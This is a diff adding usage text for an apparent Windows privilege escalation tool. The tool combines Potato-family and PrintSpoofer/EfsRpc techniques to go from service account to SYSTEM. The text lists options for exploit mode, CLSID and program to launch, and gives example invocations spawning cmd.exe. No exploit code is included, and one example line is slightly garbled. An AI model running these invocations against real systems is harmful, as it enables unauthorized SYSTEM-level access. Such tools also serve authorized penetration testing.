@@ -1,0 +1,19 @@
+ABOUT
+    Collection of native Windows privilege escalation techniques from service
+    accounts to SYSTEM. Combines RottenPotato, JuicyPotato, PrintSpoofer, and
+    EfsRpc exploit methods.
+
+USAGE:
+    net-sweet-potato --- [options]
+
+OPTIONS:
+    -c, --clsid       CLSID for DCOM exploit (default: BITS)
+    -m, --method      Auto, User, or Thread (default: Auto)
+    -p, --prog        Program to launch (default: cmd.exe)
+    -a, --args        Arguments for program
+    -e, --exploit     Exploit mode: DCOM, WinRM, EfsRpc, PrintSpoofer (default)
+    -l, --listenPort  COM server listen port (default: 6666)
+
+EXAMPLES:
+    net-sweet-potato    net-sweet-potato --- -p cmd.exe -a "/c whoami"
+    net-sweet-potato --- -e PrintSpoofer -p cmd.exe
